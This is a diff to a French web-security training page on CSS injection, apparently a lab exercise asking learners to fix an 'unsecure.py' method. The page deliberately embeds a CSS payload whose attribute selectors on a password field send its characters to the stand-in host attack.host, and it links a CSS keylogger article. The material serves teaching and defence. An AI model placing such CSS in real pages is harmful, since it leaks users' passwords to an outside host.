@@ -2,6 +2,7 @@
 {% block title %}CSS Injection{% endblock %}
 {% block head %}
 {{ super() }}
+<!-- L'attaquant a réussi à injecter dans une balise script son code malveillant-->
 <style>
   #password[value*="a"]~#a {
     background: url("https://attack.host/a");
@@ -47,14 +48,22 @@
     background: url("https://attack.host/t");
   }
 </style>
+<!-- Fin du code de l'attaquant -->
 {% endblock %}
 {% block content %}
 <p>
   Un attaquant a de nouveau réussi à inclure son code dans votre page.
   Cette fois-ci, il réussi à lire les valeurs pré-chargées dans un champ.
+  Accéder à la console de développement et regarder les requêtes qui transitent.
 </p>
+
 <p>
-  Corrigez le problème en modifiant la méthode css-injection dans le fichier unsecure.py
+<h2>Votre TODO-list</h2>
+<ul>
+  <li>
+    Corrigez le problème en modifiant la méthode css-injection dans le fichier unsecure.py
+  </li>
+</ul>
 </p>
 <form>
   Password: <input type="password" id="password" name="password" value="secret" />
@@ -68,9 +77,21 @@
 <p>
   Ressources:
 <ul>
-  <li><a href="https://developer.mozilla.org/fr/docs/Web/CSS/Attribute_selectors">MDN Attribute_selectors</a></li>
-  <li><a href="https://developer.mozilla.org/fr/docs/Web/HTTP/Headers/Content-Security-Policy/style-src">"CSP:
-      style-src" sur MDN</a></li>
+  <li>
+    <a href="https://developer.mozilla.org/fr/docs/Web/CSS/Attribute_selectors">
+      MDN Attribute_selectors
+    </a>
+  </li>
+  <li>
+    <a href="https://developer.mozilla.org/fr/docs/Web/HTTP/Headers/Content-Security-Policy/style-src">
+      "CSP: style-src" sur MDN
+    </a>
+  </li>
+  <li>
+    <a href="https://css-tricks.com/css-keylogger/">
+      CSS Keylogger
+    </a>
+  </li>
 </ul>
 </p>
 {{ macro.solution("""
